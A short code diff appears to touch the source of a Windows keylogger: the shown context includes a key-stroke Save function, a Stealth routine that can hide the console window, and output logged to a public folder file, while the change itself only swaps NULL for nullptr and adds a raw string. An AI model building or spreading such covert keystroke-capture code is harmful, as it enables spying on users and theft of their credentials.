@@ -231,7 +231,7 @@ int Save(int key_stroke) {
 
 void Stealth() {
 #ifdef visible
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
+    ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), 1); // visible window
 #endif
 
 #ifdef invisible
@@ -241,7 +241,7 @@ void Stealth() {
 
 int main() {
     // open output file in append mode
-    const char* output_filename = "C:\\Users\\Public\\KYLGGR.out";
+    const char* output_filename = R"(C:\Users\Public\KYLGGR.out)";
     std::cout << "Logging output to " << output_filename << std::endl;
     output_file.open(output_filename, std::ios_base::app);
 
